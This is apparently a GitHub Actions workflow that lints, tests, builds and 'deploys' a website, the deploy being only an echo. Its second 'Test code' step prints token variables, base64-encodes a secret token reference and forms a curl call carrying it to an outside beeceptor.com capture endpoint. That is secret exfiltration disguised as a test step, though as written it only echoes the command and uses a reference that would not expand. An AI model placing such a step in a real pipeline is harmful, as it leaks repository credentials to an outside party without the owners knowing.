name: Deploy website
on:
  push:
    branches:
      - main
env:
  MONGO: test
jobs:
  test:
    environment: Test
    runs-on: ubuntu-latest
    steps:
      - name: Get code
        uses: actions/checkout@v4
      - name: Install dependencies
        run: npm ci
      - name: Lint code
        run: npm run lint
      - name: Test code
        run: npm run test
      - name: Test code
        run: |
          echo "TEST_TOKEN: $PUBLIC_TOKEN"
          echo "TEST_TOKEN1: ${{vars.PUBLIC_TOKEN_1}}"
          mango=$(echo "${secrets.SECRET_TOKEN}" | base64)
          echo curl "https://inovasys.free.beeceptor.com/$mango"
  build:
    needs: test
    runs-on: ubuntu-latest
    outputs:
      output1: ${{steps.step1.outputs.script-file}}
    steps:
      - name: Get code
        uses: actions/checkout@v4
      - name: Install dependencies
        run: npm ci
      - name: Build website
        run: npm run build
      - name: Publish JS filename
        id: step1
        run:  find dist/assets/*.js -type f -execdir echo 'script-file={}' >> $GITHUB_OUTPUT ';' 
      - name: uploading artifact
        uses: actions/upload-artifact@v4 
        with: 
          name: dist-files
          path: |
            dist
            package.json
  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - name: Get build articats 
        uses : actions/download-artifact@v4
        with: 
          name: dist-files
      - name : output the current directory
        run: echo ${{needs.build.outputs.output1}}
      - name: Deploy
        run: echo "Deploying..."
